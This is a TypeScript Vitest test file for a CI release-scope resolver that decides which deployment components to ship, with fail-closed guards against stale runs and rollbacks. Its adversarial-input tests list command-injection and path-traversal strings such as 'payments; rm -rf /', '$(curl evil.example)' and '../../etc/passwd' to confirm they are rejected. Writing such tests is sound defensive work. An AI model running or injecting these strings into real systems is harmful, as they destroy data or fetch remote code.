import { describe, it, expect } from 'vitest';
import {
  DispatchInputError,
  RELEASE_REASONS,
  RELEASE_REASON_CODES,
  classifyPaths,
  formatOutputs,
  lastGreenRunsUrl,
  parseCodebasesInput,
  pickNewestGreenSha,
  resolveReleaseScope,
  type ReleaseApi,
  type ReleaseDispatch,
  type ReleaseGit,
  type ReleaseScopeConfig,
} from '../../src/node/tooling/release-scope.js';

const sha = (n: number): string => n.toString(16).padStart(40, '0');

type FakeGit = ReleaseGit & {
  calls: { commitExists: number; isAncestor: number; changedFiles: number };
};

function makeGit({
  commits = [] as string[],
  diverged = [] as string[],
  changed = [] as string[],
  diffThrows = false,
} = {}): FakeGit {
  const index = (c: string): number => commits.indexOf(c);
  const calls = { commitExists: 0, isAncestor: 0, changedFiles: 0 };
  return {
    calls,
    commitExists(c) {
      calls.commitExists += 1;
      return commits.includes(c) || diverged.includes(c);
    },
    isAncestor(a, b) {
      calls.isAncestor += 1;
      if (diverged.includes(a) || diverged.includes(b)) return false;
      const ia = index(a);
      const ib = index(b);
      return ia !== -1 && ib !== -1 && ia <= ib;
    },
    changedFiles() {
      calls.changedFiles += 1;
      if (diffThrows) throw new Error('git diff failed');
      return changed;
    },
  };
}

type FakeApi = ReleaseApi & { calls: { branchTip: number; latestGreenPushSha: number } };

function makeApi({
  tip = null as string | null,
  tipThrows = false,
  green = null as string | null,
  greenThrows = false,
} = {}): FakeApi {
  const calls = { branchTip: 0, latestGreenPushSha: 0 };
  return {
    calls,
    async branchTip() {
      calls.branchTip += 1;
      if (tipThrows) throw new Error('tip lookup failed');
      return tip;
    },
    async latestGreenPushSha() {
      calls.latestGreenPushSha += 1;
      if (greenThrows) throw new Error('runs lookup failed');
      return green;
    },
  };
}

const BACKEND_EXACT = [
  'firebase.json',
  'firestore.rules',
  'storage.rules',
  'scripts/post-deploy.mjs',
];

const CONFIG: ReleaseScopeConfig = {
  components: [
    {
      key: 'backend',
      pathPrefixes: ['functions/'],
      exactPaths: BACKEND_EXACT,
      dispatchByCodebases: true,
    },
    { key: 'worker_a', pathPrefixes: ['worker-a/'] },
    { key: 'worker_b', pathPrefixes: ['worker-b/'] },
    { key: 'apphosting', everyPush: true },
  ],
  controlPaths: ['.github/workflows/deploy.yml', 'scripts/release-scope.mjs'],
};

const FLAG_CONFIG: ReleaseScopeConfig = {
  components: [
    { key: 'backend', pathPrefixes: ['functions/'], exactPaths: BACKEND_EXACT },
    { key: 'apphosting', everyPush: true },
  ],
  controlPaths: ['.github/workflows/deploy.yml'],
};

const CODEBASES = ['interactive', 'payments', 'admin'];

type Args = { headSha: string; api: ReleaseApi; git: ReleaseGit; dispatch?: ReleaseDispatch };
const push = (opts: Args) =>
  resolveReleaseScope(CONFIG, { event: 'push', codebaseNames: CODEBASES, ...opts });
const dispatch = (opts: Args) =>
  resolveReleaseScope(CONFIG, { event: 'workflow_dispatch', codebaseNames: CODEBASES, ...opts });

describe('release-scope — baseline selection (push)', () => {
  it('selects the newest green push as the baseline and classifies its diff', async () => {
    const resolved = await push({
      headSha: sha(3),
      api: makeApi({ tip: sha(3), green: sha(1) }),
      git: makeGit({ commits: [sha(1), sha(2), sha(3)], changed: ['worker-a/src/index.ts'] }),
    });
    expect(resolved).toMatchObject({
      base_sha: sha(1),
      worker_a: true,
      worker_b: false,
      backend: false,
      stale: false,
      rollback_blocked: false,
      reason: RELEASE_REASONS.OK,
    });
  });

  it('rolls a failed run forward: the diff spans every push since the last GREEN run', async () => {
    const resolved = await push({
      headSha: sha(4),
      api: makeApi({ tip: sha(4), green: sha(1) }),
      git: makeGit({
        commits: [sha(1), sha(2), sha(3), sha(4)],
        changed: ['worker-b/src/a.ts', 'worker-a/src/b.ts'],
      }),
    });
    expect(resolved).toMatchObject({ base_sha: sha(1), worker_a: true, worker_b: true });
  });

  it('an equal baseline is allowed and selects only what rolls out on every push', async () => {
    const resolved = await push({
      headSha: sha(5),
      api: makeApi({ tip: sha(5), green: sha(5) }),
      git: makeGit({ commits: [sha(5)], changed: [] }),
    });
    expect(resolved).toMatchObject({
      stale: false,
      rollback_blocked: false,
      base_sha: sha(5),
      apphosting: true,
      backend: false,
    });
  });

  it('no green baseline at all → full release', async () => {
    const resolved = await push({
      headSha: sha(1),
      api: makeApi({ tip: sha(1) }),
      git: makeGit({ commits: [sha(1)] }),
    });
    expect(resolved).toMatchObject({ full_fleet: true, reason: RELEASE_REASONS.NO_GREEN_BASELINE });
  });

  it('a last-green lookup failure AFTER proven tip equality → full release (the one safe fallback)', async () => {
    const resolved = await push({
      headSha: sha(2),
      api: makeApi({ tip: sha(2), greenThrows: true }),
      git: makeGit({ commits: [sha(1), sha(2)] }),
    });
    expect(resolved).toMatchObject({
      full_fleet: true,
      rollback_blocked: false,
      reason: RELEASE_REASONS.API_ERROR,
    });
  });

  it('an unreachable newest green SHA is a full release even when an OLDER green SHA is reachable', async () => {
    const git = makeGit({ commits: [sha(1), sha(2)] });
    const resolved = await push({
      headSha: sha(2),
      api: makeApi({ tip: sha(2), green: sha(0xdead) }),
      git,
    });
    expect(resolved).toMatchObject({
      full_fleet: true,
      reason: RELEASE_REASONS.UNREACHABLE_BASELINE,
    });
    expect(resolved.base_sha).not.toBe(sha(1));
    expect(git.calls.changedFiles).toBe(0);
  });

  it('divergent history → full release', async () => {
    const resolved = await push({
      headSha: sha(9),
      api: makeApi({ tip: sha(9), green: sha(0xbeef) }),
      git: makeGit({ commits: [sha(9)], diverged: [sha(0xbeef)] }),
    });
    expect(resolved).toMatchObject({ full_fleet: true, reason: RELEASE_REASONS.DIVERGENT_HISTORY });
  });

  it('a failed diff against a reachable baseline is a full release, never a partial one', async () => {
    const resolved = await push({
      headSha: sha(3),
      api: makeApi({ tip: sha(3), green: sha(1) }),
      git: makeGit({ commits: [sha(1), sha(3)], diffThrows: true }),
    });
    expect(resolved).toMatchObject({
      full_fleet: true,
      reason: RELEASE_REASONS.UNREACHABLE_BASELINE,
    });
  });
});

describe('release-scope — rollback guards', () => {
  it('an older push behind a newer GREEN push stops as stale-run, before any diff', async () => {
    const git = makeGit({ commits: [sha(2), sha(5)] });
    const resolved = await push({
      headSha: sha(2),
      api: makeApi({ tip: sha(2), green: sha(5) }),
      git,
    });
    expect(resolved).toMatchObject({
      stale: true,
      rollback_blocked: false,
      full_fleet: false,
      reason: RELEASE_REASONS.STALE_RUN,
    });
    expect(git.calls.changedFiles).toBe(0);
  });

  it('an older push behind a newer failed push stops as branch-advanced', async () => {
    const git = makeGit({ commits: [sha(2), sha(6)] });
    const resolved = await push({
      headSha: sha(2),
      api: makeApi({ tip: sha(6), green: sha(1) }),
      git,
    });
    expect(resolved).toMatchObject({
      rollback_blocked: true,
      full_fleet: false,
      reason: RELEASE_REASONS.BRANCH_ADVANCED,
    });
    expect(git.calls.changedFiles).toBe(0);
  });

  it('branch advancement while queued stops a dispatch the same way', async () => {
    const resolved = await dispatch({
      headSha: sha(2),
      dispatch: { codebases: 'none', apphosting: true },
      api: makeApi({ tip: sha(7) }),
      git: makeGit({ commits: [sha(2), sha(7)] }),
    });
    expect(resolved).toMatchObject({
      rollback_blocked: true,
      reason: RELEASE_REASONS.BRANCH_ADVANCED,
    });
  });

  it('a branch-tip lookup failure fails CLOSED on push — never the full-release path', async () => {
    const api = makeApi({ tipThrows: true });
    const resolved = await push({ headSha: sha(2), api, git: makeGit({ commits: [sha(2)] }) });
    expect(resolved).toMatchObject({
      rollback_blocked: true,
      full_fleet: false,
      reason: RELEASE_REASONS.BRANCH_TIP_UNPROVABLE,
    });
    expect(api.calls.latestGreenPushSha).toBe(0);
  });

  it('a branch-tip lookup failure fails CLOSED on dispatch too', async () => {
    const resolved = await dispatch({
      headSha: sha(2),
      dispatch: { codebases: 'all' },
      api: makeApi({ tipThrows: true }),
      git: makeGit({ commits: [sha(2)] }),
    });
    expect(resolved).toMatchObject({
      rollback_blocked: true,
      full_fleet: false,
      reason: RELEASE_REASONS.BRANCH_TIP_UNPROVABLE,
    });
  });

  it('an unusable branch-tip response also fails closed', async () => {
    for (const tip of [null, '', 'not-a-sha', 'HEAD']) {
      const resolved = await push({
        headSha: sha(2),
        api: makeApi({ tip }),
        git: makeGit({ commits: [sha(2)] }),
      });
      expect(resolved).toMatchObject({
        rollback_blocked: true,
        reason: RELEASE_REASONS.BRANCH_TIP_UNPROVABLE,
      });
    }
  });
});

describe('release-scope — dispatch safety', () => {
  it('an old dispatch behind a newer GREEN push is stale-run and deploys nothing', async () => {
    const resolved = await dispatch({
      headSha: sha(2),
      dispatch: { codebases: 'all', full_fleet: true },
      api: makeApi({ tip: sha(2), green: sha(8) }),
      git: makeGit({ commits: [sha(2), sha(8)] }),
    });
    expect(resolved).toMatchObject({
      stale: true,
      full_fleet: false,
      backend: false,
      reason: RELEASE_REASONS.STALE_RUN,
    });
  });

  it('a dispatch AT the newest green baseline is allowed (the manual redeploy)', async () => {
    const resolved = await dispatch({
      headSha: sha(4),
      dispatch: { codebases: 'payments' },
      api: makeApi({ tip: sha(4), green: sha(4) }),
      git: makeGit({ commits: [sha(4)] }),
    });
    expect(resolved).toMatchObject({
      stale: false,
      rollback_blocked: false,
      backend: true,
      reason: RELEASE_REASONS.MANUAL_DISPATCH,
    });
  });

  it('a dispatch safety-lookup failure fails CLOSED — never a full release of an old commit', async () => {
    const resolved = await dispatch({
      headSha: sha(4),
      dispatch: { codebases: 'all', full_fleet: true },
      api: makeApi({ tip: sha(4), greenThrows: true }),
      git: makeGit({ commits: [sha(4)] }),
    });
    expect(resolved).toMatchObject({
      rollback_blocked: true,
      full_fleet: false,
      reason: RELEASE_REASONS.DISPATCH_SAFETY_UNPROVABLE,
    });
  });

  it('an unreachable newest-green SHA, or divergent history, fails a dispatch closed', async () => {
    const unreachable = await dispatch({
      headSha: sha(4),
      dispatch: { codebases: 'all' },
      api: makeApi({ tip: sha(4), green: sha(0xfeed) }),
      git: makeGit({ commits: [sha(4)] }),
    });
    expect(unreachable.reason).toBe(RELEASE_REASONS.DISPATCH_SAFETY_UNPROVABLE);
    const divergent = await dispatch({
      headSha: sha(4),
      dispatch: { codebases: 'all' },
      api: makeApi({ tip: sha(4), green: sha(0xfeed) }),
      git: makeGit({ commits: [sha(4)], diverged: [sha(0xfeed)] }),
    });
    expect(divergent).toMatchObject({
      rollback_blocked: true,
      reason: RELEASE_REASONS.DISPATCH_SAFETY_UNPROVABLE,
    });
  });

  it('a first-ever dispatch with no green baseline proceeds because the tip guard already passed', async () => {
    const resolved = await dispatch({
      headSha: sha(1),
      dispatch: { codebases: 'none', worker_a: true },
      api: makeApi({ tip: sha(1) }),
      git: makeGit({ commits: [sha(1)] }),
    });
    expect(resolved).toMatchObject({ worker_a: true, reason: RELEASE_REASONS.MANUAL_DISPATCH });
  });
});

describe('release-scope — dispatch selection mapping', () => {
  const safe = () => ({
    headSha: sha(4),
    api: makeApi({ tip: sha(4), green: sha(4) }),
    git: makeGit({ commits: [sha(4)] }),
  });

  it('a codebase selection selects the backend alone', async () => {
    const r = await dispatch({ ...safe(), dispatch: { codebases: 'payments' } });
    expect(r).toMatchObject({
      backend: true,
      worker_a: false,
      worker_b: false,
      apphosting: false,
      full_fleet: false,
    });
  });

  it('each flag-dispatched component on its own', async () => {
    for (const key of ['worker_a', 'worker_b', 'apphosting']) {
      const r = await dispatch({ ...safe(), dispatch: { codebases: 'none', [key]: true } });
      for (const other of ['backend', 'worker_a', 'worker_b', 'apphosting'])
        expect(r[other], other).toBe(other === key);
    }
  });

  it('a full release selects everything and ignores narrower inputs', async () => {
    const r = await dispatch({ ...safe(), dispatch: { codebases: 'none', full_fleet: true } });
    expect(r).toMatchObject({
      full_fleet: true,
      backend: true,
      worker_a: true,
      worker_b: true,
      apphosting: true,
    });
  });

  it('never assigns a diff baseline to a dispatch', async () => {
    expect((await dispatch({ ...safe(), dispatch: { codebases: 'all' } })).base_sha).toBe('');
  });

  it('an app with no codebase input selects its backend from a true/false flag', async () => {
    const r = await resolveReleaseScope(FLAG_CONFIG, {
      event: 'workflow_dispatch',
      ...safe(),
      dispatch: { backend: true, codebases: '$(curl evil.example)' },
    });
    expect(r).toMatchObject({
      backend: true,
      apphosting: false,
      reason: RELEASE_REASONS.MANUAL_DISPATCH,
    });
  });
});

describe('release-scope — adversarial dispatch input', () => {
  const hostile = [
    '"payments"',
    'payments; rm -rf /',
    '$(curl evil.example)',
    '`id`',
    'payments media',
    'payments,\nadmin',
    'payments,../../etc/passwd',
    'PAYMENTS',
    'not-a-codebase',
  ];

  for (const value of hostile) {
    it(`rejects ${JSON.stringify(value)} before any git or API call runs`, async () => {
      const api = makeApi({ tip: sha(4), green: sha(4) });
      const git = makeGit({ commits: [sha(4)] });
      await expect(
        dispatch({ headSha: sha(4), dispatch: { codebases: value }, api, git }),
      ).rejects.toBeInstanceOf(DispatchInputError);
      expect(api.calls.branchTip + api.calls.latestGreenPushSha).toBe(0);
      expect(git.calls.commitExists + git.calls.isAncestor + git.calls.changedFiles).toBe(0);
    });
  }

  it('accepts the legitimate forms', () => {
    expect(parseCodebasesInput('none', CODEBASES)).toEqual({ kind: 'none', names: [] });
    expect(parseCodebasesInput('', CODEBASES)).toEqual({ kind: 'none', names: [] });
    expect(parseCodebasesInput('all', CODEBASES).kind).toBe('all');
    expect(parseCodebasesInput('payments,admin', CODEBASES)).toEqual({
      kind: 'list',
      names: ['payments', 'admin'],
    });
  });
});

describe('release-scope — path classification', () => {
  it('maps each component folder to its own selection', () => {
    expect(classifyPaths(CONFIG, ['worker-a/src/a.ts'])).toMatchObject({
      worker_a: true,
      worker_b: false,
      backend: false,
    });
    expect(classifyPaths(CONFIG, ['worker-b/src/a.ts'])).toMatchObject({
      worker_b: true,
      worker_a: false,
      backend: false,
    });
    expect(classifyPaths(CONFIG, ['functions/src/index.ts']).backend).toBe(true);
  });

  it('maps every exact backend path, and only those exact names', () => {
    for (const file of BACKEND_EXACT)
      expect(classifyPaths(CONFIG, [file]).backend, file).toBe(true);
    for (const file of ['firebase.dev.json', 'config/firebase.json', 'firebase.json.bak']) {
      expect(classifyPaths(CONFIG, [file]).backend, file).toBe(false);
    }
  });

  it('treats every control path as a full-release trigger, and nothing else', () => {
    for (const file of CONFIG.controlPaths)
      expect(classifyPaths(CONFIG, [file]).control, file).toBe(true);
    expect(classifyPaths(CONFIG, ['src/app/page.tsx']).control).toBe(false);
  });

  it('a control-path change forces the full release on a push', async () => {
    const resolved = await push({
      headSha: sha(3),
      api: makeApi({ tip: sha(3), green: sha(1) }),
      git: makeGit({ commits: [sha(1), sha(3)], changed: ['.github/workflows/deploy.yml'] }),
    });
    expect(resolved).toMatchObject({
      full_fleet: true,
      reason: RELEASE_REASONS.CONTROL_FILE_CHANGE,
      backend: true,
      worker_a: true,
      worker_b: true,
      apphosting: true,
    });
  });

  it('the every-push component is selected on a push that changed only a Worker', async () => {
    const resolved = await push({
      headSha: sha(3),
      api: makeApi({ tip: sha(3), green: sha(1) }),
      git: makeGit({ commits: [sha(1), sha(3)], changed: ['worker-b/README.md'] }),
    });
    expect(resolved).toMatchObject({
      apphosting: true,
      worker_b: true,
      backend: false,
      full_fleet: false,
    });
  });
});

describe('release-scope — baseline query + outputs', () => {
  it('only successful PUSH runs of the named workflow on the branch are baseline candidates', () => {
    const url = lastGreenRunsUrl('owner/repo', 'develop', 'deploy.yml');
    expect(url).toContain('/actions/workflows/deploy.yml/runs');
    expect(url).toContain('event=push');
    expect(url).toContain('status=success');
    expect(url).toContain('branch=develop');
  });

  it('takes the newest run by GitHub ordering and never this run itself', () => {
    const runs = [
      { id: 100, head_sha: sha(9) },
      { id: 99, head_sha: sha(8) },
    ];
    expect(pickNewestGreenSha(runs, 100)).toBe(sha(8));
    expect(pickNewestGreenSha(runs, 42)).toBe(sha(9));
    expect(pickNewestGreenSha([], 42)).toBeNull();
    expect(pickNewestGreenSha(undefined, 42)).toBeNull();
  });

  it('emits every output key in the fixed order: guards, then the components in config order, then the reason', async () => {
    const resolved = await push({
      headSha: sha(3),
      api: makeApi({ tip: sha(3), green: sha(1) }),
      git: makeGit({ commits: [sha(1), sha(3)], changed: [] }),
    });
    const keys = formatOutputs(CONFIG, resolved)
      .split('\n')
      .map((line) => line.split('=')[0]);
    expect(keys).toEqual([
      'base_sha',
      'stale',
      'rollback_blocked',
      'full_fleet',
      'backend',
      'worker_a',
      'worker_b',
      'apphosting',
      'reason',
    ]);
  });

  it('every scenario reports a fixed reason code — never raw exception, API, or git text', async () => {
    const scenarios = [
      push({
        headSha: sha(3),
        api: makeApi({ tip: sha(3), green: sha(1) }),
        git: makeGit({ commits: [sha(1), sha(3)] }),
      }),
      push({
        headSha: sha(3),
        api: makeApi({ tipThrows: true }),
        git: makeGit({ commits: [sha(3)] }),
      }),
      push({
        headSha: sha(3),
        api: makeApi({ tip: sha(4) }),
        git: makeGit({ commits: [sha(3), sha(4)] }),
      }),
      push({
        headSha: sha(3),
        api: makeApi({ tip: sha(3), greenThrows: true }),
        git: makeGit({ commits: [sha(3)] }),
      }),
      push({ headSha: sha(3), api: makeApi({ tip: sha(3) }), git: makeGit({ commits: [sha(3)] }) }),
      push({
        headSha: sha(3),
        api: makeApi({ tip: sha(3), green: sha(0xaaa) }),
        git: makeGit({ commits: [sha(3)] }),
      }),
      push({
        headSha: sha(3),
        api: makeApi({ tip: sha(3), green: sha(0xaaa) }),
        git: makeGit({ commits: [sha(3)], diverged: [sha(0xaaa)] }),
      }),
      push({
        headSha: sha(3),
        api: makeApi({ tip: sha(3), green: sha(5) }),
        git: makeGit({ commits: [sha(3), sha(5)] }),
      }),
      push({
        headSha: sha(3),
        api: makeApi({ tip: sha(3), green: sha(1) }),
        git: makeGit({ commits: [sha(1), sha(3)], changed: ['scripts/release-scope.mjs'] }),
      }),
      dispatch({
        headSha: sha(3),
        dispatch: { codebases: 'all' },
        api: makeApi({ tip: sha(3), green: sha(3) }),
        git: makeGit({ commits: [sha(3)] }),
      }),
      dispatch({
        headSha: sha(3),
        dispatch: { codebases: 'all' },
        api: makeApi({ tip: sha(3), greenThrows: true }),
        git: makeGit({ commits: [sha(3)] }),
      }),
    ];
    for (const resolved of await Promise.all(scenarios))
      expect(RELEASE_REASON_CODES).toContain(resolved.reason);
  });
});
